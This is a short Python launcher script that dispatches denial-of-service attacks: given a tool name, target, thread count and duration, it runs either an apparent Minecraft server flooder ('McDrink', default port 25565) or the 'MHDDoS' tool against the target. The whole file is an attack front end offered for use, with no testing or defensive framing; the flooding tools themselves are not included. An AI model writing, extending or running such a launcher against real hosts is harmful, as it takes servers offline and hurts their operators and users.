import sys
import subprocess
import os

if __name__ == "__main__":
    if len(sys.argv) < 5:
        print("Usage: python start.py <TOOL> <TARGET> <THREADS> <DURATION>")
        print("TOOL: mc | ddos")
        sys.exit(1)

    tool = sys.argv[1].lower()
    target = sys.argv[2]
    threads = sys.argv[3]
    duration = sys.argv[4]

    if tool == "mc":
        host = target.split(":")[0]
        port = target.split(":")[1] if ":" in target else "25565"
        print(f"[*] Launching McDrink on {host}:{port}")
        subprocess.run(["python", "tools/mcdrink.py", host, port, duration])
    elif tool == "ddos":
        print(f"[*] Launching MHDDoS on {target}")
        subprocess.run(["python", "tools/mhddos.py", target, threads, duration])
    else:
        print("[!] Tool not found. Use 'mc' or 'ddos'")
